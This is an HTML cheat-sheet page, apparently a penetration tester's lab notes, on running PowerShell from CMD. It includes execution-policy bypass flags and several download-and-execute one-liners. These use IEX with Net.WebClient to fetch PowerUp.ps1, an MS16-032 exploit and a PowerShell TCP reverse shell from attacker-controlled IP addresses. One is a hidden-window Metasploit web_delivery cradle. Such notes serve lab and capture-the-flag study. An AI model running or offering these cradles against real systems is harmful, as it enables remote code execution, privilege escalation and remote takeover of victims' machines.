<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PowerShell from CMD</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Run PowerShell from CMD</h1></strong><br />If none of the below are working, try moving to the powershell location and run powershell from there<br /><br /><strong><h2>## Commands</h2></strong><br /><code>&quot;</code> isn&#39;t always necessary. Try without.<br /><br /><code>powershell &quot;&lt;powershell commands&gt;&quot;<br />powershell -c &quot;&lt;powershell commands&gt;&quot;</code><br /><br /><strong><h2>## Scripts</h2></strong><br />Note that you might have to bypass execution policies.<br /><code>powershell.exe -nop -exec bypass script.ps1</code><br /><code>powerhsell -NoProfile -ExecutionPolicy Unrestricted script.ps1</code><br /><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1</code> - non-interactive<br /><br /><strong><h2>## Scripts on Remote Hosts</h2></strong><br /><code>IEX</code> = Invoke Expressions<br />IEX will download the string and execute and/or load it into memory<br /><br /><code>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.8:8000/PowerUp.ps1&#39;)&quot;</code><br />or<br /><code>powershell.exe -nop -exec bypass &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.8:8000/PowerUp.ps1&#39;)&quot;</code><br /><br />Input a function from the script to run it:<br /><code>Invoke-AllChecks</code><br /><br />Run script and invoke a function on 1 line:<br /><code>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.8:8000/ms16.ps1&#39;); Invoke-MS16-032&quot;</code><br /><br />If &quot; and &#39; cause problems, try this:<br />(generated by metasploit&#39;s web_delivery module)<br /><code>powershell.exe -nop -w hidden -c $t=new-object net.webclient;$t.proxy=[Net.WebRequest]::GetSystemWebProxy();$t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $t.downloadstring(&#39;</code><a href="http://10.10.14.5:8090/3eYP1GJ6iH')">http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1&#39;)</a><code>;</code></div>
</body>
</html>
